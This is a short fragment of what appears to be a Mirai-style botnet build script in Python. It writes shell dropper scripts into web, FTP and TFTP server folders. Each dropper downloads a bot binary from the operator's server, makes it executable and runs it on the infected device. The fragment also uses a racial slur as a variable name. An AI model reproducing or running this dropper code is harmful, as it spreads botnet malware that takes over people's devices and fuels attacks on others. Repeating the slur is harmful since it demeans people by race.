...
if Nigger == True:
    ...
    for i in CompArchName:
        run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/' + i + '; curl -O http://' + ip + '/' + i + ';cat ' + i + ' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+botid+'" >> /var/www/html/8UsA.sh')
        run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' ' + i + ' ' + i + ';cat ' + i + ' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+botid+'" >> /var/ftp/8UsA1.sh')
        run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+botid+'" >> /var/lib/tftpboot/t8UsA.sh')
        run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ' + i + ' -g ' + ip + ';cat ' + i + ' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+botid+'" >> /var/lib/tftpboot/t8UsA2.sh')    
        run("service xinetd restart &> /dev/null")
